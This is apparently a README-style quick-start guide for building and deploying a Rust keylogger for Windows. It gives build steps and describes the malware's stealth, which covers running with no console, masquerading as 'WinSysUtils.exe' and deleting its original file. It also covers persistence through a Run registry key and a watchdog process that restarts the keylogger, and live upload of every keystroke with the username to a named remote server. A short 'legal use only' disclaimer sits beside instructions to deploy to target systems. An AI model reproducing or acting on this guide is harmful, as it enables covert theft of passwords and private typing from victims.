# Quick Start Guide

## Building the Windowless Keylogger

### Step 1: Install Prerequisites
1. Install Rust from https://rustup.rs/
2. Install Visual Studio Build Tools with "Desktop development with C++"

### Step 2: Build Release Version
```powershell
cd C:\Users\Ari Cummings\RustroverProjects\RustKeyLogger
cargo build --release
```

This creates: `target\release\RustKeyLogger.exe` (NO console window)

### Step 3: Test the Executable
```powershell
.\target\release\RustKeyLogger.exe
```

When you double-click or run this, it will:
- ✅ Run with NO console window (silent)
- ✅ Install to `%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe`
- ✅ Add startup registry entry
- ✅ Start watchdog process
- ✅ Begin capturing keystrokes
- ✅ Upload to API immediately

## What Happens After Running

### Installation
```
%LOCALAPPDATA%\WindowsSystemUtility\
├── WinSysUtils.exe          (main keylogger)
└── 847261950384.exe         (watchdog - random 12 digits)
```

### Registry Entry
```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Name:  WinSysUtils
Value: "C:\Users\{User}\AppData\Local\WindowsSystemUtility\WinSysUtils.exe"
```

### Running Processes
```
WinSysUtils.exe    (main keylogger)
847261950384.exe   (watchdog monitoring main process)
```

## Verification Commands

### Check Installation
```powershell
# Files
dir "$env:LOCALAPPDATA\WindowsSystemUtility"

# Registry
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WinSysUtils

# Processes
tasklist | findstr /i "WinSys"
```

### Monitor Activity
```powershell
# Watch processes
Get-Process | Where-Object {
    $_.Name -like "*WinSys*" -or $_.Name -match '^\d{12}$'
} | Format-Table Name, Id, Path -AutoSize
```

## Testing the Console vs No Console

### Debug Build (SHOWS CONSOLE)
```powershell
cargo build
.\target\debug\RustKeyLogger.exe
# A console window will appear
```

### Release Build (NO CONSOLE)
```powershell
cargo build --release
.\target\release\RustKeyLogger.exe
# NO console window - runs silently in background
```

## Configuration

Edit `src/main.rs` before building:

```rust
// Line 23: Change API endpoint
const API_URL: &str = "https://your-server.com/log";

// Line 24: Change polling speed
const POLL_DELAY_MS: u64 = 10; // milliseconds
```

Username is automatically detected from `%USERNAME%` environment variable.

## How It Works

### On First Run
```
1. RustKeyLogger.exe (original location)
   ↓
2. Creates %LOCALAPPDATA%\WindowsSystemUtility\
   ↓
3. Copies to WinSysUtils.exe
   ↓
4. Adds registry startup entry
   ↓
5. Starts WinSysUtils.exe
   ↓
6. Deletes RustKeyLogger.exe (original)
   ↓
7. Original process exits
```

### When WinSysUtils.exe Runs
```
1. Checks if watchdog exists
   ↓
2. Creates watchdog (e.g., 847261950384.exe)
   ↓
3. Starts background thread to monitor watchdog
   ↓
4. Enters keylogger loop:
   - Polls keyboard every 10ms
   - Detects new key presses
   - Sends to API immediately
```

### Watchdog Behavior
```
Main Process              Watchdog Process
(WinSysUtils.exe)        (847261950384.exe)
     ↓                           ↓
 Running                    Monitoring
     ↓                           ↓
     ↓ ←──── Check every 1s ────┘
     ↓
If terminated → Watchdog restarts it
     ↓
Main checks watchdog every 2s
     ↓
If watchdog terminated → Main restarts it
```

## API Communication

### Request Format
```http
POST https://keylogger.delphigamerz.xyz/log?username=JohnDoe
Content-Type: text/plain

Hello World<F5>
```

### When Keys are Sent
- **Immediately** after each keystroke
- No buffering (unlike C# version which used buffers)
- Silent failure on network errors

### What Gets Captured
- Letters: `a-z` (with Shift/Caps)
- Numbers: `0-9` (with Shift for special chars)
- Special: `Space`, `Enter` (as `\r\n`)
- Function: `<F1>` through `<F12>`
- Other: `<Backspace>`, `<Delete>`, `<Insert>`

## Uninstallation

### Complete Removal
```powershell
# 1. Kill all processes
Get-Process | Where-Object {
    $_.Name -like "*WinSys*" -or $_.Name -match '^\d{12}$'
} | Stop-Process -Force

# 2. Remove files
Remove-Item "$env:LOCALAPPDATA\WindowsSystemUtility" -Recurse -Force

# 3. Remove registry
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysUtils"

# 4. Verify
echo "Removed!"
```

## Troubleshooting

### Console Window Still Appears
**Problem**: Console shows when double-clicking the exe

**Solution**: Make sure you built with `--release`:
```powershell
cargo build --release
# Use: target\release\RustKeyLogger.exe (not debug)
```

### Doesn't Start on Boot
**Problem**: Not running after restart

**Solutions**:
1. Check registry entry exists:
   ```powershell
   reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WinSysUtils
   ```
2. Verify path is correct
3. Check if antivirus blocked it

### Can't Build - Linker Errors
**Problem**: `error LNK1104: cannot open file 'msvcrt.lib'`

**Solution**: Install Visual Studio Build Tools:
1. Download from: https://visualstudio.microsoft.com/downloads/
2. Select "Desktop development with C++"
3. Install and restart

### Keystrokes Not Captured
**Possible Causes**:
- Running in VM or sandbox
- Antivirus blocking keyboard access
- Administrator privileges required
- Running on non-Windows system

## Security Notes

### Antivirus Detection
This WILL be detected by antivirus software because:
- Captures keyboard input
- Has persistence mechanisms
- Creates additional processes
- Communicates over network

**This is expected and correct behavior for a keylogger.**

### Legal Use Only
⚠️ **WARNING**: Unauthorized use is illegal!
- Only use on systems you own or have explicit permission to monitor
- Follow all local laws and regulations
- Educational purposes only

## Performance

### Resource Usage
- **CPU**: Very low (~0.1% on modern systems)
- **Memory**: ~5-10 MB
- **Network**: Minimal (only keystroke data)
- **Disk**: ~2-3 MB executable

### Polling Rate
- Keyboard polled every 10ms
- Matches C# version behavior
- Adjustable via `POLL_DELAY_MS` constant

## Next Steps

1. ✅ Build release version
2. ✅ Test locally
3. ✅ Verify no console window
4. ✅ Check API uploads working
5. ✅ Test persistence (reboot)
6. ✅ Verify watchdog restarts main
7. ✅ Deploy to target systems (legally!)

## Support

For issues:
1. Check `CONVERSION_SUMMARY.md` for details
2. Review `README.md` for full documentation
3. Verify C# comparison in summary

Project complete! 🎉

